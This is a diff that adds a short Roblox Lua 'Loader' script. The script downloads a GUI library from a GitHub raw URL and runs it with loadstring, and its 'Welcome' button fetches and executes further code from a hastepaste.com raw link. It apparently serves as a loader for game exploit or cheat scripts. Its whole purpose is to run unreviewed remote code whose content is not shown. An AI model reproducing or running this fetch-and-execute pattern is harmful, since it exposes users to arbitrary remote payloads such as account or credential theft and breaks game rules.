@@ -1,0 +1,21 @@
+local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/aaaa"))()
+
+local UI = GUI:CreateWindow("Loader","Welcome")
+
+local Home = UI:addPage("Main",1,true,6)
+
+Home:addLabel("Loader","Created by LX")
+
+Home:addButton("Welcome",function()
+
+    game.StarterGui:SetCore("SendNotification",{
+
+        Title = "Loader by LLC";
+
+        Text = "Welcome.";
+
+        loadstring(game:HttpGet("https://hastepaste.com/raw/IuVEUHl"))()
+
+    })
+
+end)
